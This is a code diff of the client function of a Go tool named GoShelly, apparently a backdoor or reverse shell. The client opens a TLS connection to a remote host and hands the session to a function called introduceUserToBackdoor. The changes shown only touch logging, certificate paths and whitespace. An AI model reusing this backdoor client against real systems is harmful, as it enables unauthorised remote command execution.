@@ -341,7 +341,8 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int, raw bool
 
 	CONFIG.MAXLOGSTORE = logmax
 	CONFIG.LOGNAME = strings.ReplaceAll("GoShelly_last.log", " ", "")
-	os.MkdirAll("./logs/", os.ModePerm)
+	// os.MkdirAll("./logs/", os.ModePerm)
+
 	clientfile, err := os.OpenFile(CONFIG.LOGNAME, os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Printf("Client log open error: %s. No logs available for this session.\n", err)
@@ -351,9 +352,9 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int, raw bool
 		defer clientfile.Close()
 	}
 	CONFIG = readStartConfigJSON(cfgf, CONFIG) //change false to true if you have a json config file
-	genCert()
+	GoGenCert()
 
-	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
+	cert, err := tls.LoadX509KeyPair("goshelly_certs/client.pem", "goshelly_certs/client.key")
 	if err != nil {
 		CONFIG.CLIENTLOG.Println("Could not load SSL Certificate. Exiting...")
 		return  false
@@ -366,7 +367,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int, raw bool
 	case true:
 		introduceUserToBackdoor(conn,t.LoggedUser{
 
-			} )
+		} )
 
 	case false:
 		user := GetLoggedUser()
@@ -404,7 +405,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int, raw bool
 	}
 
 	CONFIG.CLIENTLOG.Println("All commands ran successfully. Returning exit success.")
-	logClean("./logs/")
+	// logClean("./logs/")
 	fmt.Printf("Exit Success.\nReturning Log.\n\n")
 	return true
 	// returnLog()
